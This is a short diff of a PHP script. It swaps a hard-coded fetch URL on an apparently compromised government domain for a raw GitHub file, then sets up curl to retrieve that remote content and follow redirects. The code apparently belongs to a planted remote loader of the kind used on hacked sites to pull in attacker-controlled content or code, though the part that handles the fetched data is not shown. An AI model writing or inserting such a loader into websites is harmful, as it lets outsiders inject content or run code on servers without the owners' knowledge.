@@ -1,6 +1,6 @@
 	
 <?php
-$url = 'https://anaya.sragenkab.go.id/?id=ombak123';
+$url = 'https://raw.githubusercontent.com/atomtempur/minggir/refs/heads/main/file.txt';
 $ch = curl_init($url);
 curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
